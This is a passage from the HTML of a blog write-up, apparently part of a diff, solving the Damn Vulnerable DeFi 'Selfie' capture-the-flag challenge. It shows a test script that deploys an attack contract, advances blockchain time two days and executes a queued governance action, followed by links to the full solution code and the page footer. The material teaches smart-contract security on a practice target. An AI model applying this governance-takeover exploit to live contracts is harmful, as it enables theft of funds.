+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">AttackFactory</span> = <span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackSelfie&#39;</span>, <span style="color:#000">deployer</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">attack</span> = <span style="color:#00f">await</span> <span style="color:#000">AttackFactory</span>.<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">governance</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>, <span style="color:#000">attacker</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">send</span>(<span style="color:#5a2">&#34;evm_increaseTime&#34;</span>, [<span style="color:#3af">2</span> * <span style="color:#3af">24</span> * <span style="color:#3af">60</span> * <span style="color:#3af">60</span>]); <span style="color:#888;font-style:italic">// 2 days
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">executeAction</span>(<span style="color:#3af">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/selfie/selfie.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackSelfie.sol" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot" target="_blank" rel="noopener noreffer ">ERC20Snapshot</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 14, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/" data-title="Damn Vulnerable DeFi - Challenge #6 - Selfie" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_06_selfie/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/damnvulnerabledefi_05_the-rewarder/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #5 - The rewarder"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #5 - The rewarder</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
